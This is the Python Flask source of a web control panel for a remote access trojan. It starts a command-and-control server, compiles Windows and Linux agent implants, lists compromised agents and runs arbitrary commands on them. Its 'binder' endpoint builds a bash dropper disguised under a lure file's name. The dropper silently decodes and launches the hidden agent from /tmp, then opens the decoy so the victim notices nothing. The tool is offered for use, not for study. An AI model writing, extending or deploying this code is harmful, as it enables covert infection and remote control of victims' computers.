import os
import base64
import subprocess
import threading
import urllib.request
import json
from flask import Flask, render_template, request, jsonify, send_file

app = Flask(__name__)

# Base config
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RAT_DIR = os.environ.get('RAT_DIR', os.path.abspath(os.path.join(BASE_DIR, '..', 'RAT_projet-main', 'rat')))
C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'http://localhost:8080')

server_process = None
build_status = {"status": "idle", "output": "", "message": ""}
build_thread = None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/server/status', methods=['GET'])
def server_status():
    global server_process
    is_running = server_process is not None and server_process.poll() is None
    return jsonify({"running": is_running})

@app.route('/api/server/start', methods=['POST'])
def start_server():
    global server_process
    if server_process is None or server_process.poll() is not None:
        try:
            server_process = subprocess.Popen(
                ['cargo', 'run', '-p', 'server'],
                cwd=RAT_DIR,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return jsonify({"status": "started"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "already_running"}), 400

@app.route('/api/server/stop', methods=['POST'])
def stop_server():
    global server_process
    if server_process and server_process.poll() is None:
        server_process.terminate()
        server_process = None
        return jsonify({"status": "stopped"})
    return jsonify({"status": "not_running"}), 400

# -------------------------------------------------------------------
# Build system
# -------------------------------------------------------------------
def run_build(target, output_name=""):
    global build_status
    build_status = {"status": "building", "output": "", "message": ""}
    try:
        import shutil
        if target == 'windows':
            out_name = output_name if output_name else 'agent.windows.exe'
            cmd = ['cargo', 'build', '-p', 'agent', '--release']
            result = subprocess.run(cmd, cwd=RAT_DIR, capture_output=True, text=True, timeout=900, shell=os.name=='nt')
            if result.returncode == 0:
                src = os.path.join(RAT_DIR, 'target', 'release', 'agent.exe')
                dst = os.path.join(RAT_DIR, 'target', out_name)
                if os.path.exists(src):
                    shutil.copy2(src, dst)
                build_status = {"status": "success", "output": result.stdout + f"\nSuccess: Agent built to target/{out_name}"}
            else:
                build_status = {"status": "error", "message": result.stderr}
        else:
            if target == 'x86_64':
                target_triple = 'x86_64-unknown-linux-musl'
                out_name = output_name if output_name else 'agent.linux_x86_64'
            else:
                target_triple = 'aarch64-unknown-linux-musl'
                out_name = output_name if output_name else 'agent.linux_aarch64'

            if os.name == 'posix' and target == 'x86_64':
                cmd = ['cargo', 'build', '-p', 'agent', '--release', '--target', target_triple]
                errorMessageContext = "Note: Ensure 'musl-tools' is installed and rust target added."
            else:
                cmd = ['cross', 'build', '-p', 'agent', '--release', '--target', target_triple]
                errorMessageContext = "Note: 'cross' is required for cross-compilation. Run 'cargo install cross'."

            result = subprocess.run(cmd, cwd=RAT_DIR, capture_output=True, text=True, timeout=900, shell=os.name=='nt')
            if result.returncode == 0:
                src = os.path.join(RAT_DIR, 'target', target_triple, 'release', 'agent')
                dst = os.path.join(RAT_DIR, 'target', out_name)
                if os.path.exists(src):
                    try:
                        shutil.copy2(src, dst)
                    except:
                        pass
                build_status = {"status": "success", "output": result.stdout + f"\nSuccess: Agent built to target/{out_name}"}
            else:
                build_status = {"status": "error", "message": result.stderr + f"\n\n{errorMessageContext}"}
    except FileNotFoundError:
        build_status = {"status": "error", "message": "Build tool not found. Please install Rust and/or cross."}
    except Exception as e:
        build_status = {"status": "error", "message": str(e)}

@app.route('/api/agent/build', methods=['POST'])
@app.route('/api/agent/build/start', methods=['POST'])
def build_agent_start():
    global build_thread, build_status
    if build_status["status"] == "building":
        return jsonify({"status": "error", "message": "A build is already in progress."}), 400
    target = request.json.get('target', 'windows')
    output_name = request.json.get('output_name', '')
    if target not in ['windows', 'x86_64', 'aarch64']:
        target = 'windows'
    build_thread = threading.Thread(target=run_build, args=(target, output_name))
    build_thread.start()
    return jsonify({"status": "started"})

@app.route('/api/agent/build/status', methods=['GET'])
def get_build_status():
    global build_status
    st = build_status["status"]
    if st in ["idle", "building"]:
        return jsonify({"status": st})
    res = build_status.copy()
    build_status["status"] = "idle"
    if res["status"] == "error":
        return jsonify(res), 500
    return jsonify(res)

# -------------------------------------------------------------------
# Agents — proxy the live C2 server
# -------------------------------------------------------------------
@app.route('/api/agents', methods=['GET'])
def get_agents():
    try:
        req = urllib.request.Request(f"{C2_SERVER_URL}/api/agents")
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            return jsonify(data)
    except Exception as e:
        return jsonify({"status": "error", "message": f"C2 server unreachable: {e}"}), 503

# -------------------------------------------------------------------
# Binder — list compiled agents + generate dropper
# -------------------------------------------------------------------
@app.route('/api/agents/built', methods=['GET'])
def list_built_agents():
    """Returns the list of compiled agent binaries in RAT_DIR/target/"""
    target_dir = os.path.join(RAT_DIR, 'target')
    agents = []
    if os.path.isdir(target_dir):
        for f in os.listdir(target_dir):
            fpath = os.path.join(target_dir, f)
            if os.path.isfile(fpath) and 'agent' in f.lower():
                agents.append(f)
    return jsonify({"agents": sorted(agents)})

@app.route('/api/binder/create', methods=['POST'])
def create_binder():
    """
    Accepts:
      - multipart field 'decoy'  : the lure file uploaded by the user
      - form field 'agent'       : filename of the compiled agent in RAT_DIR/target/
    Returns:
      - A self-extracting bash dropper with the same extension as the decoy file.
    """
    if 'decoy' not in request.files or not request.form.get('agent'):
        return jsonify({"status": "error", "message": "Missing 'decoy' file or 'agent' field."}), 400

    decoy_file = request.files['decoy']
    agent_name = request.form.get('agent')
    decoy_filename = decoy_file.filename  # keeps original name + extension

    agent_path = os.path.join(RAT_DIR, 'target', agent_name)
    if not os.path.isfile(agent_path):
        return jsonify({"status": "error", "message": f"Agent binary '{agent_name}' not found in target/"}), 404

    try:
        # Base64-encode both files
        decoy_bytes = decoy_file.read()
        decoy_b64 = base64.b64encode(decoy_bytes).decode('ascii')

        with open(agent_path, 'rb') as f:
            agent_b64 = base64.b64encode(f.read()).decode('ascii')

        # Build the self-extracting bash dropper
        dropper_script = f"""#!/bin/bash
# Self-extracting dropper — {decoy_filename}
AGENT_B64="{agent_b64}"
DECOY_B64="{decoy_b64}"
DECOY_NAME="{decoy_filename}"
TMP_AGENT=$(mktemp /tmp/.XXXXXXXXXX)
TMP_DECOY=$(mktemp /tmp/XXXXXXXXXX_{decoy_filename})
# Extract and launch agent silently
printf '%s' "$AGENT_B64" | base64 -d > "$TMP_AGENT"
chmod +x "$TMP_AGENT"
nohup "$TMP_AGENT" >/dev/null 2>&1 &
# Extract and open decoy file to show the user something normal
printf '%s' "$DECOY_B64" | base64 -d > "$TMP_DECOY"
chmod 644 "$TMP_DECOY"
if command -v xdg-open &>/dev/null; then
    xdg-open "$TMP_DECOY" &
fi
"""

        # Write to a temp file for download
        import tempfile
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(decoy_filename)[1])
        tmp.write(dropper_script.encode('utf-8'))
        tmp.close()
        # Make the file executable
        os.chmod(tmp.name, 0o755)

        return send_file(
            tmp.name,
            as_attachment=True,
            download_name=decoy_filename,
            mimetype='application/octet-stream'
        )
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# -------------------------------------------------------------------
# Command execution (via client binary if compiled)
# -------------------------------------------------------------------
@app.route('/api/agents/exec', methods=['POST'])
def exec_command():
    agent_id = request.json.get('agent_id')
    command = request.json.get('command')
    if not agent_id or not command:
        return jsonify({"status": "error", "message": "Missing agent_id or command"}), 400
    try:
        result = subprocess.run(
            ['cargo', 'run', '-p', 'client', '--', 'exec', '-a', agent_id, command],
            cwd=RAT_DIR, capture_output=True, text=True, timeout=60
        )
        return jsonify({"output": result.stdout, "error": result.stderr})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
